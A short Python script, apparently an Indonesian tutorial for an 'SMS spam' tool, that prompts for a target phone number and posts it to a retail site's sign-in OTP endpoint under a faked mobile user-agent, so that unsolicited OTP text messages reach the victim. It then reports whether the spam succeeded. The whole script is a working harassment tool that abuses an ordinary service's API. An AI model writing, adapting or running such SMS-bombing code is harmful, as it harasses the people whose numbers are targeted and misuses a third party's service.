import requests,json

logo = """
tutorial cara membuat script spam sms simple mapclub
"""
print(logo)
nomor = input("[+] masukkan nomor target : ")

data = {
"phone":nomor,
}
head = {
"Connection":"keep-alive",
"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
}
for ah in range(2):
    ah = requests.post("https://cmsapi.mapclub.com/api/signin-otp", data=data, headers=head)
    q = json.loads(ah.text)
    if "error" in q:
        print("spam sms gagal")
    else:
        print("spam sms berhasil")
